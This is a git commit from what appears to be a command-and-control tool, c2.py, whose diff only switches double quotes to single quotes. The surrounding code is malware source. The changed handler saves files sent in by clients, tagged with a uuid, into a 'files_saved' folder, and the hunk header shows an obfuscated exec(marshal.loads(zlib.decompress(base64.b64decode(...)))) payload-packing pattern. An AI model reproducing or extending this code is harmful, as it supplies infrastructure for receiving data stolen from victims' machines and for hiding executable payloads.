755f45c5c88a5368e23c9ec8068d436cf83bb48e
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-01 08:35:41 -0400

    switched " wotj '

--- c2.py
+++ c2.py
@@ -227,6 +227,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         if not os.path.isdir('files_saved'):
             os.makedirs('files_saved')
 
-        with open(f"files_saved/{data['uuid']}_{datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")}_{data['file_name']}", 'w') as f:
+        with open(f"files_saved/{data['uuid']}_{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}_{data['file_name']}", 'w') as f:
             f.writelines(str(base64.b64decode(data['file']).decode('utf-8')))
 
